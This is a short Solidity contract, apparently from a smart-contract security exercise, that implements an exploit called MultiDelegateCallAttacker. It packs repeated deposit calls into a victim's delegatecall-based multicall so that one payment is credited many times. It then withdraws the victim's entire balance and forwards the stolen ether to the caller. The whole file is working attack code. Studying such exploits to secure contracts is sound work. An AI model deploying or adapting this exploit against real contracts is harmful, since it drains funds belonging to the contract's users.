// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "hardhat/console.sol";

interface IMultiDelegateCall {
    function deposit() external payable;

    function withdraw(uint256 amount) external;

    function multicall(bytes[] calldata data) external payable;
}

contract MultiDelegateCallAttacker {
    function attack(address victim) public payable {
        uint256 depositsNum = victim.balance / 1 ether + 2;
        bytes[] memory calls = new bytes[](depositsNum);
        for (uint256 i; i < depositsNum; ) {
            calls[i] = abi.encodeCall(IMultiDelegateCall.deposit, ());
            unchecked {
                ++i;
            }
        }
        // calls[calls.length - 1] = abi.encodeCall(IMultiDelegateCall.withdraw, depositsNum * 1 ether);
        IMultiDelegateCall(victim).multicall{value: msg.value}(calls);
        IMultiDelegateCall(victim).withdraw(victim.balance);
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "transfer failed");
    }

    receive() external payable {}
}
